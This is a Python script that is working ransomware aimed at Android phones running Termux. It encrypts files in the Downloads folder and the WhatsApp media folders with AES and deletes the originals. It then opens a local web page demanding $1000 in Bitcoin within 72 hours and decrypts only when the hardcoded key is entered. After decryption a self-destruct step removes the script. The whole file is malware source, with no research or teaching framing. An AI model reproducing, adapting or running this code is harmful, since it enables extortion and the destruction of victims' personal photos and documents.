import os
import sys
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import subprocess
from http.server import HTTPServer, SimpleHTTPRequestHandler
import socketserver
import threading
from urllib.parse import parse_qs
import base64
import time
import random
import atexit

# ===== CONFIGURATION =====
TARGET_DIRS = [
    "/data/data/com.termux/files/home/storage/downloads",
    "/data/data/com.termux/files/home/storage/shared/Android/Media/com.whatsapp/WhatsApp/Media",
    "/data/data/com.termux/files/home/storage/shared/Android/Media/com.whatsapp.w4b/WhatsApp Business/Media"
]
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
PORT = random.randint(8000, 9000)  # Random port
IMAGE_FILE = "horror.png"  # Background image
SCRIPT_FILE = os.path.abspath(__file__)  # Full path of current script
DEFAULT_KEY = "balls123456"  # Plaintext key for reliability

# Pre-configured message
WEB_MESSAGE = """YOUR FILES HAVE BEEN ENCRYPTED!

TO RECOVER YOUR FILES YOU MUST:
1. SEND $1000 IN BITCOIN TO: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
2. EMAIL YOUR TRANSACTION ID TO: recovery@protonmail.com
3. ENTER THE DECRYPTION KEY BELOW

WARNING: 
- YOU HAVE 72 HOURS TO COMPLY
- ATTEMPTS TO BRUTE FORCE WILL CORRUPT YOUR FILES"""

# ===== PROTECTED FILES =====
PROTECTED_FILES = {SCRIPT_FILE, os.path.abspath(IMAGE_FILE)}

# ===== SELF-DESTRUCT MECHANISM =====
def self_destruct():
    """Delete the script and image file after verifying all files are decrypted"""
    # First verify no encrypted files remain
    if not verify_decryption_complete():
        print("\n[!] Could not verify all files were decrypted - aborting self-destruct")
        return
    
    try:
        time.sleep(2)  # Small delay to ensure everything completed
        if os.path.exists(SCRIPT_FILE):
            os.remove(SCRIPT_FILE)
        if os.path.exists(IMAGE_FILE):
            os.remove(IMAGE_FILE)
        print("\n[+] Self-destruct sequence complete")
    except Exception as e:
        print(f"\n[-] Self-destruct failed: {e}")

def verify_decryption_complete():
    """Check that no .enc files remain in target directories"""
    for target_dir in TARGET_DIRS:
        if not os.path.exists(target_dir):
            continue
            
        for root, _, files in os.walk(target_dir):
            for filename in files:
                if filename.endswith('.enc'):
                    return False
    return True

# Register self-destruct to run at program exit
atexit.register(self_destruct)

# ===== UTILITIES =====
def get_key(password):
    return hashlib.sha256(password.encode()).digest()

def show_loader():
    phases = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    for _ in range(15):
        sys.stdout.write(f"\r{random.choice(phases)} Processing files... ")
        sys.stdout.flush()
        time.sleep(0.1)
    print("\r" + " " * 40 + "\r", end="")

def get_image_base64():
    try:
        with open(IMAGE_FILE, "rb") as f:
            return base64.b64encode(f.read()).decode()
    except:
        return None

# ===== CORE ENCRYPTION =====
def should_process_file(filepath):
    """Check if file should be processed (not protected, not already encrypted, size OK)"""
    abs_path = os.path.abspath(filepath)
    return (os.path.isfile(filepath) and 
            abs_path not in PROTECTED_FILES and
            not filepath.endswith('.enc') and
            os.path.getsize(filepath) <= MAX_FILE_SIZE)

def encrypt_file(filepath, key):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        
        cipher = AES.new(key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data, AES.block_size))
        
        encrypted_path = filepath + ".enc"
        with open(encrypted_path, 'wb') as f:
            f.write(cipher.iv)
            f.write(ct_bytes)
        
        os.remove(filepath)
        return True
    except Exception as e:
        print(f"Error encrypting {filepath}: {str(e)}", file=sys.stderr)
        return False

def decrypt_file(filepath, key):
    try:
        with open(filepath, 'rb') as f:
            iv = f.read(16)
            ct = f.read()
        
        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        
        decrypted_path = filepath[:-4]
        with open(decrypted_path, 'wb') as f:
            f.write(pt)
        
        os.remove(filepath)
        return True
    except Exception as e:
        print(f"Error decrypting {filepath}: {str(e)}", file=sys.stderr)
        return False

def process_all_files(action="encrypt"):
    key = get_key(DEFAULT_KEY)
    processed_files = 0
    
    for target_dir in TARGET_DIRS:
        if not os.path.exists(target_dir):
            continue
            
        for root, _, files in os.walk(target_dir):
            for filename in files:
                filepath = os.path.join(root, filename)
                
                if action == "encrypt":
                    if should_process_file(filepath):
                        if encrypt_file(filepath, key):
                            processed_files += 1
                else:
                    if filepath.endswith('.enc'):
                        if decrypt_file(filepath, key):
                            processed_files += 1
    
    return processed_files

# ===== WEB INTERFACE =====
class EncryptionHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        image_data = get_image_base64()
        bg_style = f"background: url('data:image/png;base64,{image_data}') no-repeat center center fixed; background-size: cover;" if image_data else ""
        
        html = f"""
        <html><head><title>FILE RECOVERY</title>
        <style>
            body {{ 
                {bg_style}
                font-family: Arial, sans-serif; 
                color: white;
                text-align: center;
                padding-top: 50px;
                margin: 0;
            }}
            .container {{
                background: rgba(0,0,0,0.85);
                margin: auto;
                width: 80%;
                max-width: 800px;
                padding: 30px;
                border: 2px solid red;
                border-radius: 10px;
                box-shadow: 0 0 20px red;
            }}
            h1 {{
                color: red;
                text-shadow: 0 0 10px red;
            }}
            .message {{
                background: rgba(50,0,0,0.7);
                padding: 20px;
                margin: 20px 0;
                border-left: 5px solid red;
                text-align: left;
            }}
            input[type="password"] {{
                width: 80%;
                padding: 12px;
                margin: 10px 0;
                background: #111;
                color: white;
                border: 1px solid red;
                font-size: 16px;
            }}
            button {{
                background: linear-gradient(to right, #ff0000, #800000);
                color: white;
                border: none;
                padding: 12px 25px;
                font-size: 16px;
                cursor: pointer;
                margin-top: 15px;
                border-radius: 5px;
            }}
            .result {{
                margin-top: 20px;
                padding: 15px;
                border-radius: 5px;
            }}
            .success {{
                background: rgba(0,50,0,0.7);
                border: 1px solid lime;
            }}
            .error {{
                background: rgba(50,0,0,0.7);
                border: 1px solid red;
            }}
        </style></head>
        <body>
            <div class="container">
                <h1>⚠️ FILE RECOVERY PORTAL ⚠️</h1>
                <div class="message">
                    {WEB_MESSAGE.replace('\n', '<br>')}
                </div>
                <form method="post">
                    <input type="password" name="key" placeholder="Enter decryption key" required>
                    <button type="submit">DECRYPT FILES</button>
                </form>
                <div id="result">%RESULT%</div>
            </div>
        </body></html>
        """
        self.wfile.write(html.replace("%RESULT%", "").encode())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()
        key = parse_qs(post_data).get('key', [''])[0]
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        # Regenerate the HTML template
        image_data = get_image_base64()
        bg_style = f"background: url('data:image/png;base64,{image_data}') no-repeat center center fixed; background-size: cover;" if image_data else ""
        
        html_template = f"""
        <html><head><title>FILE RECOVERY</title>
        <style>
            body {{ 
                {bg_style}
                font-family: Arial, sans-serif; 
                color: white;
                text-align: center;
                padding-top: 50px;
                margin: 0;
            }}
            .container {{
                background: rgba(0,0,0,0.85);
                margin: auto;
                width: 80%;
                max-width: 800px;
                padding: 30px;
                border: 2px solid red;
                border-radius: 10px;
                box-shadow: 0 0 20px red;
            }}
            h1 {{
                color: red;
                text-shadow: 0 0 10px red;
            }}
            .message {{
                background: rgba(50,0,0,0.7);
                padding: 20px;
                margin: 20px 0;
                border-left: 5px solid red;
                text-align: left;
            }}
            input[type="password"] {{
                width: 80%;
                padding: 12px;
                margin: 10px 0;
                background: #111;
                color: white;
                border: 1px solid red;
                font-size: 16px;
            }}
            button {{
                background: linear-gradient(to right, #ff0000, #800000);
                color: white;
                border: none;
                padding: 12px 25px;
                font-size: 16px;
                cursor: pointer;
                margin-top: 15px;
                border-radius: 5px;
            }}
            .result {{
                margin-top: 20px;
                padding: 15px;
                border-radius: 5px;
            }}
            .success {{
                background: rgba(0,50,0,0.7);
                border: 1px solid lime;
            }}
            .error {{
                background: rgba(50,0,0,0.7);
                border: 1px solid red;
            }}
        </style></head>
        <body>
            <div class="container">
                <h1>⚠️ FILE RECOVERY PORTAL ⚠️</h1>
                <div class="message">
                    {WEB_MESSAGE.replace('\n', '<br>')}
                </div>
                <form method="post">
                    <input type="password" name="key" placeholder="Enter decryption key" required>
                    <button type="submit">DECRYPT FILES</button>
                </form>
                <div id="result">%RESULT%</div>
            </div>
        </body></html>
        """
        
        if key == DEFAULT_KEY:
            result_html = """
            <div class="result success">
                Decryption started! Your files will be restored shortly.
                <br>This may take several minutes depending on the number of files.
                <br>The system will automatically shut down after completion.
            </div>
            """
            # Start decryption in background
            def decryption_wrapper():
                process_all_files("decrypt")
                # Verify before exiting
                if verify_decryption_complete():
                    os._exit(0)
                else:
                    print("\n[!] Some files could not be decrypted - aborting self-destruct")
            
            threading.Thread(target=decryption_wrapper).start()
        else:
            result_html = """
            <div class="result error">
                INVALID DECRYPTION KEY! Access attempt logged.
            </div>
            """
        
        self.wfile.write(html_template.replace("%RESULT%", result_html).encode())

# ===== MAIN EXECUTION =====
def run_server():
    with socketserver.TCPServer(("", PORT), EncryptionHandler) as httpd:
        print(f"Server running on port {PORT}")
        httpd.serve_forever()

def main():
    show_loader()
    
    # Encrypt files in background (skipping protected files)
    threading.Thread(target=process_all_files, daemon=True).start()
    
    # Start web server
    threading.Thread(target=run_server, daemon=True).start()
    
    # Open browser
    try:
        subprocess.run(
            ['termux-open-url', f'http://localhost:{PORT}'],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except:
        pass
    
    # Keep program running
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nExiting...")
        os._exit(0)

if __name__ == "__main__":
    # Check for dependencies
    try:
        from Crypto.Cipher import AES
        main()
    except ImportError:
        print("Installing required packages...")
        os.system("pip install pycryptodome")
        main()
